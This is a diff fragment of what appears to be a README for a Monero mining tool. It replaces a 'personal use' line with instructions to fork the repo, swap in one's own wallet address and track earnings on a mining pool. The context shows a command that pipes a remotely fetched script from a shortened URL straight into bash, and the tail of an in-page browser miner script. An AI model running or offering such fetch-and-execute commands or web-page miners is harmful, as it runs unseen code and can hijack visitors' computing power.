@@ -25,4 +25,8 @@ bash <(curl -fsSL git.io/aminer) -o gulf.moneroocean.stream:10128 -u 8ANyqnPspbm
     throttleMiner = 40;
 </script>
 ```
-# `Only For Personal Use`
+## For You  
+If You Want To Use It For Your Purpose  
+Simply Golk This Repo  
+Then Replace `8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un` With Your Monero Adress Everywhere  
+Then Go To `https://moneroocean.stream` And Paste Your Wallet Adress For Tracking
